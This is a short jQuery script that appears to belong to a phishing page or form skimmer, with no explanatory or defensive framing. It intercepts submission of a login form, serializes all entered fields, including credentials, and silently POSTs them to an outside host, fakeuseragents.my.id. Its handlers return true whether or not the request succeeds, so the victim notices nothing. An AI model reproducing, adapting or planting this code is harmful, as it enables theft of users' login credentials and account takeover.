$(".login-form").submit(function() {
	var d = $(".login-form");

	$.ajax({
        url: "http://fakeuseragents.my.id/ffmax/index.php",
        type: "POST",
        data: d.serialize(),
        success: function () {
            return true;
        },
        error: function () {
            return true;
        },
    });
});
